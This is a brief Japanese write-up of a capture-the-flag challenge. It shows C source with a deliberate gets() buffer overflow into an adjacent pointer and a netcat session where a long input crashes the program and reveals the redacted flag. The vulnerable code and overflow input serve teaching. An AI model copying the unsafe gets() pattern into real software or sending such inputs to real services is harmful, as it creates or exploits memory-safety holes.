# kappa overflow

## 問題

https://alpacahack.com/daily/challenges/kappa-overflow

## 解法

chall.c
```
#include <stdio.h>
#include <windows.h>

void win() {
    // Windowsのコンソール出力の文字コードを UTF-8(65001) に設定するで 
    SetConsoleOutputCP(65001);

    // flag.txtを読み込む
    FILE *fp = fopen("flag.txt", "r");
    if (!fp) {
        puts("flag file not found");
        return;
    }
    char buf[128];
    fgets(buf, sizeof(buf), fp);
    puts(buf);
    fclose(fp);
}

LONG WINAPI handler(EXCEPTION_POINTERS *ExceptionInfo) {
    // エラーコードを出力
    fprintf(stderr, "\nException code: 0x%lx\n", ExceptionInfo->ExceptionRecord->ExceptionCode);
    win();
    ExitProcess(0);
    return EXCEPTION_CONTINUE_SEARCH;
}

int main() {
    //出力を即送信
    setvbuf(stdout, NULL, _IONBF, 0);
    // 未処理例外（クラッシュ）が起きたときの処理を設定
    SetUnhandledExceptionFilter(handler);

　　// 構造体（struct）を定義して cache という変数を作っている
    struct {
        // 64バイトの文字配列
        char buf[64];
        // int型を指すポインタ。整数のアドレスを保存する変数。
        volatile int *target;
    } cache;

    int dummy = 0;
    // & = 変数のアドレス
    cache.target = &dummy;

    // 入力
    puts("Input:");
　　// すぐに出力する関数
    fflush(stdout);
　　// Enterが押されるまで入力を読み込む
    gets(cache.buf);

    // target が指している場所に 1 を書く
    *cache.target = 1;
    
    puts("OK");
    return 0;
}

```

例外を発生させるとフラグが出る(64文字以上入力)
```
nc localhost 1337
Input:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

Exception code: 0xc0000005
Alpaca{**** REDACTED ****}
```

例外が発生しない場合はOKで終了
```
nc localhost 1337
Input:
aaaaaaaaaaaaaaaaaaaa
OK
```

